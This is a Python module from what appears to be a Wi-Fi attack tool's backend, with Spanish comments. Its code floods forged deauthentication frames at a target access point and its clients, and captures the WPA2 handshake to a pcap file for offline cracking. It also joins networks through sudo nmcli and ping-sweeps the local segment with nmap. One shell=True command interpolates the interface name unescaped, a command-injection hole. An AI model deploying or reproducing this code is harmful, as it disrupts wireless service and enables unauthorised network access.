# backend/drivers/wifi/wifi_lan.py
import threading
import time
import os
import subprocess
from datetime import datetime
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, Ether, srp, sniff

from backend.core.socket_manager import socket_manager
from backend.database import SessionLocal
from backend.models import WiFiCapture, WiFiClient
from backend.config import INTERFACE_ATTACK
from .wifi_monitor import wifi_monitor

class WiFiLAN:
    def __init__(self):
        self._deauth_thread = None
        self._sniffer_thread = None
        self.is_deauthing = False
        self.target_bssid = None
        self.handshake_captured = False

    # 1. MÓDULO DE DESAUTENTICACIÓN TÁCTICA
    def trigger_deauth(self, iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF", count: int = 45):
        self.target_bssid = bssid
        self.is_deauthing = True
        def _run():
            print(f"[LAN ATTACK] Lanzando ráfaga Deauth -> AP: {bssid} | Cliente: {client}")
            try:
                pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                for _ in range(count):
                    if not self.is_deauthing: break
                    sendp(pkt, iface=iface, verbose=False, count=1)
                    time.sleep(0.05)
            except Exception as e: print(f"[LAN ATTACK ERR] Error durante inyección Deauth: {e}")
            finally: self.is_deauthing = False
        threading.Thread(target=_run, daemon=True).start()

    # 2. MÓDULO DE CAPTURA EAPOL (HANDSHAKE)
    def start_handshake_sniffer(self, iface: str, bssid: str):
        self.handshake_captured = False
        def _packet_filter(pkt):
            if self.handshake_captured: return
            from scapy.all import EAPOL
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                addr1, addr2, addr3 = pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3
                if bssid.lower() in [str(addr1).lower(), str(addr2).lower(), str(addr3).lower()]:
                    self._save_handshake(bssid, pkt)
        self._sniffer_thread = threading.Thread(target=lambda: sniff(iface=iface, prn=_packet_filter, stop_filter=lambda p: self.handshake_captured, timeout=45), daemon=True)
        self._sniffer_thread.start()

    def _save_handshake(self, bssid: str, packet):
        self.handshake_captured = True
        os.makedirs("backend/storage/handshakes", exist_ok=True)
        filename = f"backend/storage/handshakes/handshake_{bssid.replace(':', '')}.pcap"
        from scapy.utils import wrpcap
        wrpcap(filename, packet, append=True)
        db = None
        try:
            db = SessionLocal()
            db.add(WiFiCapture(ssid="Red Interceptada", bssid=bssid, channel=1, encryption="WPA2", capture_type="HANDSHAKE", payload_path=filename, timestamp=datetime.utcnow()))
            db.commit()
            socket_manager.broadcast_sync("WIFI_HANDSHAKE", {"bssid": bssid, "status": "SUCCESS", "path": filename})
        except Exception as e: print(f"[ORM ERR] {e}")
        finally:
            if db: db.close()

    # 3. MÓDULO DE ASOCIACIÓN DE RED
    def asociar_antena_externa(self, ssid: str, password: str) -> bool:
        """Fuerza la asociación de la antena externa limpiando bloqueos del kernel."""
        iface = INTERFACE_ATTACK
        wifi_monitor.enable_managed_mode()
        time.sleep(0.3)
        
        print(f"[NET LINK] Limpiando pila de red para {iface} antes de conectar...")
        try:
            subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
            time.sleep(0.4)
            subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
            time.sleep(0.6)

            subprocess.run(["sudo", "nmcli", "connection", "delete", ssid], capture_output=True)
            time.sleep(0.2)

            print(f"[NET LINK] Enviando nmcli connect a la red '{ssid}'...")
            cmd = ["sudo", "nmcli", "device", "wifi", "connect", ssid, "password", password, "ifname", iface]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
            
            if proc.returncode == 0:
                print(f"[NET LINK] ¡Enlace exitoso! Sincronizando IP...")
                time.sleep(3.5)
                return True
            else:
                print(f"[NET LINK ERR] nmcli rechazado por el kernel. Motivo: {proc.stderr.strip()}")
                return False
        except Exception as e:
            print(f"[NET LINK CRITICAL] Fallo de comando en subsistema: {e}")
            return False

    # 4. MÓDULO DE BARRIDO POTENTE (NMAP FINGERPRINTING)
    def obtener_segmento_autodetectado(self, iface: str) -> str:
        try:
            cmd = f"ip route show dev {iface} | grep -v default | awk '{{print $1}}'"
            segmento = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
            return segmento if segmento and "/" in segmento else "192.168.1.0/24"
        except: return "192.168.1.0/24"

    def trigger_arp_scan(self, ip_range: str = None):
        def _run():
            iface = INTERFACE_ATTACK
            rango = ip_range if (ip_range and ip_range != "192.168.1.0/24") else self.obtener_segmento_autodetectado(iface)
            
            print(f"[LAN SCAN] Ejecutando Nmap Escáner Híbrido en {rango}")
            try:
                # 🟢 REVOLUCIÓN DE COMANDO: 
                # -sP / -sn: Barrido de ping (detecta hosts vivos sin importar sus puertos)
                # --PE: Fuerza pings ICMP tradicionales
                # --packet-trace: Opcional, pero asegura el envío
                cmd = ["sudo", "nmap", "-sn", "-PE", rango]
                proc = subprocess.run(cmd, capture_output=True, text=True)
                
                hosts_detectados = []
                current_ip = None
                
                # Procesamos la salida estándar para capturar CUALQUIER host que responda al ping
                for line in proc.stdout.splitlines():
                    if "Nmap scan report for" in line:
                        current_ip = line.split()[-1]
                        # Limpiamos paréntesis si Nmap devuelve el formato con nombre (192.168.0.X)
                        current_ip = current_ip.strip("()")
                        
                        # Por defecto, asumimos que está activo. Si no saca "OS details" más adelante,
                        # ya tiene una marca base para que aparezca en tu pantalla ámbar.
                        hosts_detectados.append({
                            "ip": current_ip,
                            "tipo": "DISPOSITIVO DE RED ACTIVO"
                        })
                    
                    # Si de casualidad el router o la laptop revelan detalles extras, se actualiza el tipo
                    if "OS details:" in line and len(hosts_detectados) > 0:
                        hosts_detectados[-1]["tipo"] = line.replace("OS details:", "").strip()
                    elif "MAC Address:" in line and len(hosts_detectados) > 0:
                        # Si encuentra la MAC, la extraemos para enriquecer la interfaz
                        partes_mac = line.split("MAC Address:")[1].strip().split()
                        if partes_mac:
                            hosts_detectados[-1]["tipo"] += f" ({' '.join(partes_mac[1:])})"

                # 🚀 ALIMENTACIÓN Y VOLCADO AL MOTOR ORM CON PARCHE NOT NULL
                db = SessionLocal()
                hosts_sincronizados = []
                try:
                    for host in hosts_detectados:
                        # Filtrar direcciones de red/broadcast puras
                        if host["ip"].endswith(".0") or host["ip"].endswith(".255"): continue
                        
                        client_row = db.query(WiFiClient).filter(WiFiClient.ip_address == host["ip"]).first()
                        if not client_row:
                            client_row = WiFiClient(
                                mac="DETECTED",
                                associated_bssid=None,
                                searching_for=None,
                                rssi=0,  
                                client_type=host["tipo"],  
                                ip_address=host["ip"],
                                last_seen=datetime.utcnow()
                            )
                            db.add(client_row)
                        else:
                            client_row.client_type = host["tipo"]
                            client_row.rssi = 0
                            client_row.last_seen = datetime.utcnow()
                        db.commit()

                        hosts_sincronizados.append({
                            "ip": host["ip"],
                            "ip_address": host["ip"],
                            "mac": "DETECTED",
                            "client_type": host["tipo"],
                            "tipo": host["tipo"]
                        })
                except Exception as orm_err:
                    print(f"[LAN SCAN ORM ERR] Fallo guardando hosts: {orm_err}")
                finally:
                    db.close()
                
                print(f"[LAN SCAN WS] Volcando {len(hosts_sincronizados)} hosts al bus de Sockets.")
                socket_manager.broadcast_sync("WIFI_LAN_HOSTS", hosts_sincronizados)
                
            except Exception as e:
                print(f"[LAN SCAN CRITICAL] {e}")
                socket_manager.broadcast_sync("WIFI_LAN_HOSTS", [])

        threading.Thread(target=_run, daemon=True).start()

wifi_lan = WiFiLAN()